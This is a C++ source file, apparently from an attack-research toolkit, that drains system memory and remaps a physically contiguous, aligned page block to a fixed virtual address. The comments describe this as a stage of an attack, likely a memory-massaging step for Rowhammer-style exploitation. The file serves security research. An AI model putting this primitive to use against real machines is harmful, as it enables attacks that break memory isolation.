#include "rubench.hpp"
#include "rubicon.hpp"

#include <cstdio>
#include <cstdlib>
#include <unistd.h>
#include <sys/mman.h>

#define ZONE_RESERVE 0xc0000000UL

void* get_page_block_once(void* address) {
    // Drain memory so the allocator must split big blocks
    size_t drain_size = PAGE_SIZE * sysconf(_SC_AVPHYS_PAGES) - ZONE_RESERVE;

    // MAP_POPULATE forces immediate backing, ensuring the pages
    // really come from the buddy allocator and are not lazily allocated.
    void* drain = mmap(NULL, drain_size, PROT_READ | PROT_WRITE,
                       MAP_PRIVATE | MAP_ANONYMOUS | MAP_POPULATE, -1, 0);
    if(drain == MAP_FAILED) {
        printf("Failed to drain memory\n");
        exit(EXIT_FAILURE);
    }

    size_t block_size = 2 * kPageBlockSize;

    // Locate the last page we own and compute its PA.
    // The end of the drained region is the part most likely to lie in
    // a freshly-split, contiguous block, because the allocator consumes
    // smaller orders first and splits larger ones only at the very end.
    void* drain_end = (void*)((unsigned long)drain + drain_size - PAGE_SIZE);
    unsigned long drain_end_phys = rubench_va_to_pa(drain_end);

    // Walk back to the previous 2 MiB boundary
    // We want an entire page-block; subtract the PA’s offset inside
    //  its 2 MiB region and then go one full block backwards so the whole
    //  range belongs to us.
    void* page_block_aligned = (void*)((unsigned long)drain_end -
        (drain_end_phys % block_size) - block_size);

    // Remap exactly that 2 MiB span to a fixed VA
    // Using MREMAP_FIXED lets us park the block at a predictable
    // virtual address (REMAP_ADDRESS) without copying. The physical
    // pages stay put; only page tables change, which is cheap and keeps
    // the block contiguous.
    void* page_block = mremap(page_block_aligned, block_size,
                              block_size,
                              MREMAP_FIXED | MREMAP_MAYMOVE, address);

    // No further use for the huge ‘drain’ region – free it to relieve
    // memory pressure before the next stages of the attack.
    munmap(drain, drain_size);

    unsigned long start_phys = rubench_va_to_pa(page_block);
    unsigned long end_phys   = rubench_va_to_pa(
        (void*)((unsigned long)page_block + block_size - PAGE_SIZE));

    // Heuristic check if it's continuous.
    if(start_phys % block_size == 0 &&
        end_phys % block_size == block_size - PAGE_SIZE) {
        return page_block;
    }

    return MAP_FAILED;
}

void* get_4mb_block(void* address) {
    void* pageblock;

    do {
        pageblock = get_page_block_once(address);
    } while(pageblock == MAP_FAILED);

    return pageblock;
}